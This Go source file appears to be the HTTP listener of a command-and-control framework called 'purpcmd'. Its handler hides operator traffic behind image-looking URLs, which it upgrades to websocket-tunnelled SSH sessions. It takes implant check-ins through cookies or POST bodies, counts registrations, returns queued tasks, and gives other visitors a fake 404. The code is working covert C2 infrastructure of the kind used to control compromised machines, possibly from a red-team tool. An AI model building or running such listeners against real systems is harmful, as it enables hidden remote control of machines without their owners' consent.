package listener

import (
	"io"
	"net/http"
	"purpcmd/internal"
	"purpcmd/server/callback"
	//imp "purpcmd/server/implant"
	"purpcmd/server/log"
	"purpcmd/server/ssh"
	"purpcmd/server/utils"
	"strings"

	"github.com/gorilla/websocket"
)

func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
	if strings.Contains(r.URL.Path, ".png") || strings.Contains(r.URL.Path, ".jpg") || strings.Contains(r.URL.Path, ".gif") {
		up := websocket.Upgrader{}
		conn, err := up.Upgrade(w, r, nil)
		if err != nil {
			log.AsyncWriteStdoutErr(err.Error())
			return
		}
	
		
		webSockConn := utils.New(conn) // New addapter
		log.AsyncWriteStdoutInfo("initiating interactive session")
		ssh.Connector(webSockConn)

		return
	}

	a,task := processPayload(r)
	
	if uint16(a) == internal.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	} else if uint16(a) == internal.REG {
		l.Association = l.Association + 1
	}

	w.WriteHeader(200)

	if len(task) >= 8 {
		w.Write(task)
		return
	}
	w.Write([]byte("Hi!"))
}


func processPayload(r *http.Request) (uint16, []byte) {
	var data []byte
	var err error

	name := r.URL.Query().Get("a")
	
	if r.Method == "GET" {
		cookies := r.Cookies()
		if len(cookies) == 0 {
			return internal.NIL, []byte{}
		} else {
			data = []byte(cookies[0].Value)
		}
	} else if r.Method == "POST" {
		data, err = io.ReadAll(r.Body)
		if err != nil {
			log.AsyncWriteStdout(err.Error())
			return internal.NIL, []byte{}
		}
	}

	
	return callback.ParseCallback(data, r, name)
}